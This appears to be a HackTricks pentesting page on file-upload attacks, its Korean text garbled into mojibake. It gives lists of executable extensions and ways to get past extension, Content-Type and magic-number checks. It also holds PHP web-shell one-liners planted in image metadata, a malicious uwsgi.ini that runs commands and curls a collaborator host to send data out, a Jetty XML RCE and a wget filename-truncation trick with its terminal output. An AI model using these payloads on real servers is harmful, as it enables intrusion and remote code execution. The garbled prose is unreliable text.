# íŒŒì¼ ì—…ë¡œë“œ

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ì±„ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ê¸° ë° êµ¬ì‚¬ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

## íŒŒì¼ ì—…ë¡œë“œ ì¼ë°˜ ë°©ë²•ë¡ 

ê¸°íƒ€ ìœ ìš©í•œ í™•ì¥ì:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8ì—ì„œ ì‘ì—…í•˜ê¸°**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws ì›¹ ì„œë²„**: _.yaws_

### íŒŒì¼ í™•ì¥ì ê²€ì‚¬ ìš°íšŒ

1. ì ìš©ë˜ëŠ” ê²½ìš°, **ì´ì „ í™•ì¥ì**ë¥¼ **í™•ì¸**í•©ë‹ˆë‹¤. ë˜í•œ ì¼ë¶€ **ëŒ€ë¬¸ì**ë¥¼ ì‚¬ìš©í•˜ì—¬ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤: _pHp, .pHP5, .PhAr ..._
2. _ì‹¤í–‰ í™•ì¥ì **ì•ì— ìœ íš¨í•œ í™•ì¥ìë¥¼ ì¶”ê°€í•˜ì—¬ í™•ì¸í•©ë‹ˆë‹¤** (ì´ì „ í™•ì¥ìë„ ì‚¬ìš©):_
* _file.png.php_
* _file.png.Php5_
3. **ëì— íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì¶”ê°€í•´ ë³´ì„¸ìš”.** Burpë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  **ascii** ë° **Unicode** ë¬¸ìë¥¼ **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (_ì´ì „ì˜ **í™•ì¥ì**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë” ë‚˜ì€ í˜ì´ë¡œë“œë¥¼ ì¤€ë¹„í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤._)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. **ì„œë²„ ì¸¡ì˜ í™•ì¥ì íŒŒì„œë¥¼ ì†ì—¬ì„œ ë³´í˜¸ë¥¼ ìš°íšŒí•´ ë³´ì„¸ìš”.** **í™•ì¥ì**ë¥¼ **ë‘ ë²ˆ** ì¶”ê°€í•˜ê±°ë‚˜ **ì“°ë ˆê¸°** ë°ì´í„° (**null** ë°”ì´íŠ¸)ë¥¼ í™•ì¥ì ì‚¬ì´ì— ì¶”ê°€í•˜ëŠ” ê¸°ìˆ ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. _ì´ì „ í™•ì¥ìë¥¼ ì‚¬ìš©í•˜ì—¬ ë” ë‚˜ì€ í˜ì´ë¡œë“œë¥¼ ì¤€ë¹„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. ì´ì „ ê²€ì‚¬ì— **ë˜ ë‹¤ë¥¸ í™•ì¥ì ë ˆì´ì–´ë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤**:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **ìœ íš¨í•œ í™•ì¥ì ì•ì— exec í™•ì¥ìë¥¼ ì¶”ê°€í•˜ê³  ì„œë²„ê°€ ì˜ëª» êµ¬ì„±ë˜ê¸°ë¥¼ ê¸°ë„í•˜ì„¸ìš”.** (í™•ì¥ì** _**.php**_**ë¡œ ëë‚˜ì§€ ì•Šë”ë¼ë„** ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” Apache ì˜ëª» êµ¬ì„±ì˜ ê²½ìš° ìœ ìš©í•©ë‹ˆë‹¤):
* _ì˜ˆ: file.php.png_
7. **Windowsì—ì„œ NTFS ëŒ€ì²´ ë°ì´í„° ìŠ¤íŠ¸ë¦¼(ADS)** ì‚¬ìš©. ì´ ê²½ìš°, ê¸ˆì§€ëœ í™•ì¥ì ë’¤ì— ì½œë¡  ë¬¸ì â€œ:â€ê°€ ì‚½ì…ë˜ê³  í—ˆìš©ëœ í™•ì¥ì ì•ì— ì‚½ì…ë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, **ì„œë²„ì— ê¸ˆì§€ëœ í™•ì¥ìë¥¼ ê°€ì§„ ë¹ˆ íŒŒì¼**ì´ ìƒì„±ë©ë‹ˆë‹¤ (ì˜ˆ: â€œfile.asax:.jpgâ€). ì´ íŒŒì¼ì€ ë‚˜ì¤‘ì— ë‹¤ë¥¸ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ í¸ì§‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. â€œ**::$data**â€ íŒ¨í„´ì„ ì‚¬ìš©í•˜ì—¬ ë¹„ì–´ ìˆì§€ ì•Šì€ íŒŒì¼ì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ íŒ¨í„´ ë’¤ì— ì  ë¬¸ìë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒë„ ì¶”ê°€ ì œí•œì„ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: â€œfile.asp::$data.â€)
8. íŒŒì¼ ì´ë¦„ ì œí•œì„ **ê¹¨ë³´ì„¸ìš”.** ìœ íš¨í•œ í™•ì¥ìê°€ ì˜ë¦¬ê²Œ ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì•…ì„± PHPê°€ ë‚¨ê²Œ ë©ë‹ˆë‹¤. AAA<--SNIP-->AAA.php

```
# ë¦¬ëˆ…ìŠ¤ ìµœëŒ€ 255 ë°”ì´íŠ¸
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # ì—¬ê¸°ì„œ 4ë¥¼ ë¹¼ê³  .png ì¶”ê°€
# íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì‘ë‹µì„ í™•ì¸í•˜ì—¬ í—ˆìš©ë˜ëŠ” ë¬¸ìì˜ ìˆ˜ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. 236ì´ë¼ê³  ê°€ì •í•©ì‹œë‹¤.
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# í˜ì´ë¡œë“œ ë§Œë“¤ê¸°
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, ë§¤ì§ ë„˜ë²„, ì••ì¶• ë° í¬ê¸° ì¡°ì • ìš°íšŒ

* **Content-Type** ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ë ¤ë©´ **Content-Type** **í—¤ë”**ì˜ **ê°’**ì„ ë‹¤ìŒìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **ë‹¨ì–´ ëª©ë¡**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
* íŒŒì¼ì˜ ì‹œì‘ ë¶€ë¶„ì— **ì‹¤ì œ ì´ë¯¸ì§€ì˜ ë°”ì´íŠ¸**ë¥¼ ì¶”ê°€í•˜ì—¬ **ë§¤ì§ ë„˜ë²„** ê²€ì‚¬ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤ (íŒŒì¼ ëª…ë ¹ì„ í˜¼ë™ì‹œí‚µë‹ˆë‹¤). ë˜ëŠ” **ë©”íƒ€ë°ì´í„°** ë‚´ì— ì‰˜ì„ ì‚½ì…í•©ë‹ˆë‹¤:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ë˜ëŠ” ì´ë¯¸ì§€ë¥¼ í†µí•´ **í˜ì´ë¡œë“œë¥¼ ì§ì ‘ ì‚½ì…í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:**\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* **ì••ì¶•ì´ ì´ë¯¸ì§€ì— ì¶”ê°€ë˜ëŠ” ê²½ìš°**, ì˜ˆë¥¼ ë“¤ì–´ [PHP-GD](https://www.php.net/manual/fr/book.image.php)ì™€ ê°™ì€ ì¼ë¶€ í‘œì¤€ PHP ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, ì´ì „ ê¸°ìˆ ì€ ìœ ìš©í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **PLTE ì²­í¬** [**ì—¬ê¸° ì •ì˜ëœ ê¸°ìˆ **](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)ì„ ì‚¬ìš©í•˜ì—¬ ì••ì¶•ì„ **ê²¬ë”œ ìˆ˜ ìˆëŠ”** í…ìŠ¤íŠ¸ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**ì½”ë“œê°€ ìˆëŠ” ê¹ƒí—ˆë¸Œ**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* ì›¹ í˜ì´ì§€ê°€ **ì´ë¯¸ì§€ í¬ê¸° ì¡°ì •**ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ PHP-GD í•¨ìˆ˜ `imagecopyresized` ë˜ëŠ” `imagecopyresampled`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **IDAT ì²­í¬** [**ì—¬ê¸° ì •ì˜ëœ ê¸°ìˆ **](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)ì„ ì‚¬ìš©í•˜ì—¬ ì••ì¶•ì„ **ê²¬ë”œ ìˆ˜ ìˆëŠ”** í…ìŠ¤íŠ¸ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**ì½”ë“œê°€ ìˆëŠ” ê¹ƒí—ˆë¸Œ**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* PHP-GD í•¨ìˆ˜ `thumbnailImage`ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì´ë¯¸ì§€ í¬ê¸° ì¡°ì •**ì„ ê²¬ë”œ ìˆ˜ ìˆëŠ” í˜ì´ë¡œë“œë¥¼ ë§Œë“œëŠ” ë˜ ë‹¤ë¥¸ ê¸°ìˆ ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **tEXt ì²­í¬** [**ì—¬ê¸° ì •ì˜ëœ ê¸°ìˆ **](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)ì„ ì‚¬ìš©í•˜ì—¬ ì••ì¶•ì„ **ê²¬ë”œ ìˆ˜ ìˆëŠ”** í…ìŠ¤íŠ¸ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**ì½”ë“œê°€ ìˆëŠ” ê¹ƒí—ˆë¸Œ**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### í™•ì¸í•  ê¸°íƒ€ íŠ¸ë¦­

* ì´ë¯¸ ì—…ë¡œë“œëœ íŒŒì¼ì˜ **ì´ë¦„ì„ ë°”ê¿€ ìˆ˜ ìˆëŠ”** ì·¨ì•½ì ì„ ì°¾ìŠµë‹ˆë‹¤ (í™•ì¥ìë¥¼ ë³€ê²½í•˜ê¸° ìœ„í•´).
* ë°±ë„ì–´ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ **ë¡œì»¬ íŒŒì¼ í¬í•¨** ì·¨ì•½ì ì„ ì°¾ìŠµë‹ˆë‹¤.
* **ì •ë³´ ìœ ì¶œ ê°€ëŠ¥ì„±**:
1. **ë™ì¼í•œ íŒŒì¼**ì„ **ì—¬ëŸ¬ ë²ˆ** (ê·¸ë¦¬ê³  **ë™ì‹œì—**) **ë™ì¼í•œ ì´ë¦„**ìœ¼ë¡œ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
2. **ì´ë¯¸ ì¡´ì¬í•˜ëŠ”** **íŒŒì¼** ë˜ëŠ” **í´ë”**ì˜ **ì´ë¦„**ìœ¼ë¡œ íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. **â€œ.â€, â€œ..â€, ë˜ëŠ” â€œâ€¦â€**ë¥¼ ì´ë¦„ìœ¼ë¡œ ê°€ì§„ íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, Apacheì—ì„œ **Windows**ì˜ ê²½ìš°, ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì—…ë¡œë“œëœ íŒŒì¼ì„ â€œ/www/uploads/â€ ë””ë ‰í† ë¦¬ì— ì €ì¥í•˜ë©´, â€œ.â€ íŒŒì¼ ì´ë¦„ì€ â€œ/www/â€ ë””ë ‰í† ë¦¬ì— â€œuploadsâ€ë¼ëŠ” íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.
4. **NTFS**ì—ì„œ ì‰½ê²Œ ì‚­ì œí•  ìˆ˜ ì—†ëŠ” íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤. (Windows) ì˜ˆ: **â€œâ€¦:.jpgâ€**
5. **Windows**ì—ì„œ **ì˜ëª»ëœ ë¬¸ì**ê°€ í¬í•¨ëœ íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤. (Windows) ì˜ˆ: `|<>*?â€`
6. **Windows**ì—ì„œ **ì˜ˆì•½ëœ** (**ê¸ˆì§€ëœ**) **ì´ë¦„**ìœ¼ë¡œ íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤. ì˜ˆ: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9.
* ë˜í•œ **ì‹¤í–‰ íŒŒì¼** (.exe) ë˜ëŠ” **.html** (ëœ ì˜ì‹¬ìŠ¤ëŸ¬ìš´) íŒŒì¼ì„ ì—…ë¡œë“œí•˜ì—¬ í”¼í•´ìê°€ ìš°ì—°íˆ ì—´ì—ˆì„ ë•Œ **ì½”ë“œë¥¼ ì‹¤í–‰**í•˜ë„ë¡ í•©ë‹ˆë‹¤.

### íŠ¹ìˆ˜ í™•ì¥ì íŠ¸ë¦­

**PHP ì„œë²„**ì— íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë ¤ëŠ” ê²½ìš°, [ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ **.htaccess** íŠ¸ë¦­ì„ í™•ì¸í•˜ì„¸ìš”](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
**ASP ì„œë²„**ì— íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë ¤ëŠ” ê²½ìš°, [ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•œ **.config** íŠ¸ë¦­ì„ í™•ì¸í•˜ì„¸ìš”](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` íŒŒì¼ì€ ìë°”ì˜ `.jar`ì™€ ìœ ì‚¬í•˜ì§€ë§Œ PHPìš©ì´ë©°, **PHP íŒŒì¼ì²˜ëŸ¼ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (PHPë¡œ ì‹¤í–‰í•˜ê±°ë‚˜ ìŠ¤í¬ë¦½íŠ¸ ë‚´ì— í¬í•¨).

`.inc` í™•ì¥ìëŠ” ë•Œë•Œë¡œ **íŒŒì¼ì„ ê°€ì ¸ì˜¤ëŠ” ë°ë§Œ ì‚¬ìš©ë˜ëŠ”** PHP íŒŒì¼ì— ì‚¬ìš©ë˜ë¯€ë¡œ, ëˆ„êµ°ê°€ ì´ í™•ì¥ìê°€ **ì‹¤í–‰ë˜ë„ë¡ í—ˆìš©í–ˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## **Jetty RCE**

Jetty ì„œë²„ì— XML íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´, [**ìƒˆë¡œìš´ \*.xml ë° \*.warê°€ ìë™ìœ¼ë¡œ ì²˜ë¦¬ë˜ê¸° ë•Œë¬¸ì— RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** ë”°ë¼ì„œ ë‹¤ìŒ ì´ë¯¸ì§€ì—ì„œ ì–¸ê¸‰ëœ ëŒ€ë¡œ XML íŒŒì¼ì„ `$JETTY_BASE/webapps/`ì— ì—…ë¡œë“œí•˜ê³  ì‰˜ì„ ê¸°ëŒ€í•˜ì„¸ìš”!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

ì´ ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ íƒìƒ‰ì€ ì›ë³¸ ì—°êµ¬ë¥¼ í™•ì¸í•˜ì„¸ìš”: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

ì›ê²© ëª…ë ¹ ì‹¤í–‰(RCE) ì·¨ì•½ì ì€ `.ini` êµ¬ì„± íŒŒì¼ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê²½ìš° uWSGI ì„œë²„ì—ì„œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. uWSGI êµ¬ì„± íŒŒì¼ì€ "ë§¤ì§" ë³€ìˆ˜, ìë¦¬ í‘œì‹œì ë° ì—°ì‚°ìë¥¼ í¬í•¨í•˜ê¸° ìœ„í•´ íŠ¹ì • êµ¬ë¬¸ì„ í™œìš©í•©ë‹ˆë‹¤. íŠ¹íˆ, `@(filename)`ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” '@' ì—°ì‚°ìëŠ” íŒŒì¼ì˜ ë‚´ìš©ì„ í¬í•¨í•˜ë„ë¡ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. uWSGIì—ì„œ ì§€ì›ë˜ëŠ” ë‹¤ì–‘í•œ ìŠ¤í‚´ ì¤‘ "exec" ìŠ¤í‚´ì€ íŠ¹íˆ ê°•ë ¥í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ì˜ í‘œì¤€ ì¶œë ¥ì—ì„œ ë°ì´í„°ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ `.ini` êµ¬ì„± íŒŒì¼ì´ ì²˜ë¦¬ë  ë•Œ ì›ê²© ëª…ë ¹ ì‹¤í–‰ ë˜ëŠ” ì„ì˜ íŒŒì¼ ì“°ê¸°/ì½ê¸°ë¥¼ ìœ„í•œ ì•…ì˜ì ì¸ ëª©ì ìœ¼ë¡œ ì¡°ì‘ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒì€ ë‹¤ì–‘í•œ ìŠ¤í‚´ì„ ë³´ì—¬ì£¼ëŠ” ìœ í•´í•œ `uwsgi.ini` íŒŒì¼ì˜ ì˜ˆì…ë‹ˆë‹¤:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

uWSGIì˜ êµ¬ì„± íŒŒì¼ êµ¬ë¬¸ ë¶„ì„ì˜ ëŠìŠ¨í•œ íŠ¹ì„±ì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. íŠ¹íˆ, ë…¼ì˜ëœ í˜ì´ë¡œë“œëŠ” ì´ì§„ íŒŒì¼(ì˜ˆ: ì´ë¯¸ì§€ ë˜ëŠ” PDF)ì— ì‚½ì…ë  ìˆ˜ ìˆì–´ ì ì¬ì ì¸ ì•…ìš© ë²”ìœ„ë¥¼ ë”ìš± ë„“í™ë‹ˆë‹¤.

## **wget File Upload/SSRF Trick**

ì–´ë–¤ ê²½ìš°ì—ëŠ” ì„œë²„ê°€ **`wget`**ì„ ì‚¬ìš©í•˜ì—¬ **íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œ**í•˜ê³  **URL**ì„ **ì§€ì •**í•  ìˆ˜ ìˆìŒì„ ì•Œê²Œ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê²½ìš°, ì½”ë“œëŠ” ë‹¤ìš´ë¡œë“œëœ íŒŒì¼ì˜ í™•ì¥ìê°€ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ì— ìˆëŠ”ì§€ í™•ì¸í•˜ì—¬ í—ˆìš©ëœ íŒŒì¼ë§Œ ë‹¤ìš´ë¡œë“œë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ì´ ê²€ì‚¬ëŠ” ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
**linux**ì—ì„œ **íŒŒì¼ ì´ë¦„**ì˜ **ìµœëŒ€** ê¸¸ì´ëŠ” **255**ì´ì§€ë§Œ, **wget**ì€ íŒŒì¼ ì´ë¦„ì„ **236**ìë¡œ ì˜ë¼ëƒ…ë‹ˆë‹¤. **"A"\*232+".php"+".gif"**ë¼ëŠ” íŒŒì¼ì„ **ë‹¤ìš´ë¡œë“œ**í•  ìˆ˜ ìˆìœ¼ë©°, ì´ íŒŒì¼ ì´ë¦„ì€ **ê²€ì‚¬**ë¥¼ **ìš°íšŒ**í•  ê²ƒì…ë‹ˆë‹¤(ì´ ì˜ˆì—ì„œ **".gif"**ëŠ” **ìœ íš¨í•œ** í™•ì¥ìì…ë‹ˆë‹¤) ê·¸ëŸ¬ë‚˜ `wget`ì€ íŒŒì¼ ì´ë¦„ì„ **"A"\*232+".php"**ë¡œ **ë³€ê²½**í•©ë‹ˆë‹¤.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
